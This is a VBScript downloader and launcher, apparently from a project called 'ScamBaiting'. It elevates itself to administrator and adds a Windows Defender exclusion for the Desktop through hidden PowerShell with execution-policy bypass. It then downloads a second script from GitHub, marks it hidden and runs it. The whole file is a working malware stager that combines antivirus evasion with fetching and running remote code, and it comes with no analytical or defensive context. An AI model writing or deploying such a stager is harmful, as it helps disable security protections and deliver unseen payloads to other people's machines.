Option Explicit

Dim shell, fso, ws
Dim desktop, scriptUrl, scriptPath
Dim waitTime, f

Set shell = CreateObject("Shell.Application")
Set fso = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")

' Get the desktop path
desktop = ws.SpecialFolders("Desktop")

' URL of the script to download
scriptUrl = "https://github.com/boucegame/ScamBaiting/raw/refs/heads/main/h.vbs"
scriptPath = desktop & "\h.vbs"

' Relaunch as admin if not elevated
If Not IsAdmin() Then
    shell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 1
    WScript.Quit
End If

' Add Defender exclusion for the desktop
AddDefenderExclusion desktop

' Download the VBS script (blocking)
RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri '" & scriptUrl & "' -OutFile '" & scriptPath & "' -UseBasicParsing"

' Wait up to 15 seconds for the file to exist
waitTime = 0
Do While (Not fso.FileExists(scriptPath)) And waitTime < 15000
    WScript.Sleep 500
    waitTime = waitTime + 500
Loop

If fso.FileExists(scriptPath) Then
    ' Hide the downloaded VBS script
    Set f = fso.GetFile(scriptPath)
    f.Attributes = f.Attributes Or 2 ' Hidden

    ' Launch the downloaded VBS script visibly
    ws.CurrentDirectory = desktop
    ws.Run """" & scriptPath & """", 1, False
Else
    MsgBox "Failed to download the VBS script."
End If

' === FUNCTIONS ===

Function RunHidden(cmd)
    CreateObject("WScript.Shell").Run cmd, 0, True
End Function

Sub AddDefenderExclusion(path)
    RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" & path & "' -Force"
End Sub

Function IsAdmin()
    On Error Resume Next
    IsAdmin = (CreateObject("WScript.Shell").RegRead("HKEY_USERS\S-1-5-19\Environment\TEMP") <> "")
    On Error GoTo 0
End Function